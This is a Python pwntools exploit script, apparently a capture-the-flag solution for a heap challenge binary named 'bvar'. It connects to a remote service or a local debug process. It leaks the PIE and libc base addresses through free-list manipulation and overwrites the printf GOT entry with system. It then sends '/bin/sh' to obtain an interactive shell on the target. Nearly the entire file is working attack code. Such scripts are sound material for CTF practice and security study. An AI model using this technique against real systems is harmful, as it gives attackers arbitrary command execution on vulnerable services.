from pwn import *
import sys

libc = ELF("libc-2.31.so")
elf = ELF("bvar")
if sys.argv[1] == "l":
    p = process("./bvar", env={"LD_PRELOAD":"libc-2.31.so"})
    context.terminal = ["tmux", "splitw", "-h"]
    gdb.attach(p, gdbscript='''
                            continue
                            ''')
elif sys.argv[1] == "r":
    p = remote("35.194.119.116", 7777)

def malloc(name, data):
    p.sendlineafter(">>> ", name+"="+ data)

def delete(name):
    p.sendlineafter(">>> ", "delete " + name)

def edit(name, data):
    p.sendlineafter(">>> ", "edit " + name)
    p.sendline(data)

def show(name):
    p.sendlineafter(">>> ", name)

def clear():
    p.sendlineafter(">>> ", "clear")

def solve():
    malloc("AAAA", "BBBBBBBB")
    malloc("CCCC","DDDDDDDD")
    delete("CCCC")
    malloc("DDDD", "EEEEEEEE")
    
    # leak pie
    show("DDDD")
    pie_addr = u64(p.recvline()[:6]+"\x00\x00") - 0x3594
    elf.address = pie_addr
    strchr_got = elf.got["strchr"]
    c_memory = pie_addr + 0x3580
    free_list = pie_addr+0x3520
    system = libc.symbols["system"]
    success("pie address: %s"%hex(pie_addr))
    success("strchr got: %s"%hex(strchr_got))
    success("c_memory : %s"%hex(c_memory))
    success("free_list: %s"%hex(free_list))
    success("free_head: %s"%hex(pie_addr+0x34f0))
    success("head: %s"%hex(pie_addr+0x3508))
		
    # leak libc???
    malloc("temp", p64(strchr_got))
    clear()
    malloc("1","A")
    malloc("2","B")
    delete("3")
    delete("4")

    malloc("4", "C")
    delete("4")
    clear()
    malloc("4", p64(c_memory+92))
    delete("4")
    malloc("4",p64(pie_addr + 0x3490))
    show("\x00")
    libc.address = u64(p.recvline()[:6]+"\x00\x00") - 0x4a090
    system = libc.symbols["system"]
    success("printf: %s"%hex(libc.symbols["printf"]))
    success("libc: %s"%hex(libc.address))
    success("system: %s"%hex(system))
    success("printf: %s"%hex(elf.got["printf"]))
    success("memset: %s"%hex(libc.symbols["memset"]))
    memset = libc.address + 0x18eaf0
    success("memset: %s"%hex(memset))
    clear()                 
    malloc("a", "b")        # empty the free_list
    malloc("x", "y")
    delete("a")
    delete("x")
    clear()
    malloc("clgt", ">")
    malloc("clgt", "<")

    clear()                 # set head to NULL
    p.sendlineafter('>>> ', 'A=b')      					# create note a => head = note a

    p.sendlineafter('>>> ', 'delete A') 					# move note a to free_list => [0] note a data [1] note a and head still is note a
                                                	
	# when create note a, because head isnt NULL => note a only get a chunk from free_list[1]
    # => then note a data ptr is note a ptr itself
    # => when we write to note a data, we write to note a
    p.sendlineafter('>>> ', 'A=' + p64(elf.got['printf']))

    p.sendlineafter('>>> ', 'edit ' + p32(memset & 0xffffffff))
    sleep(0.1)
    p.sendline(p32(libc.symbols['system'] & 0xffffffff))
    p.sendlineafter('>>> ', p32(libc.symbols['system'] & 0xffffffff) + '=')
    p.sendlineafter('>>> ', 'clear')
    p.sendlineafter('>>> ', '/bin/sh')

    p.interactive()

if __name__ == "__main__":
    solve()
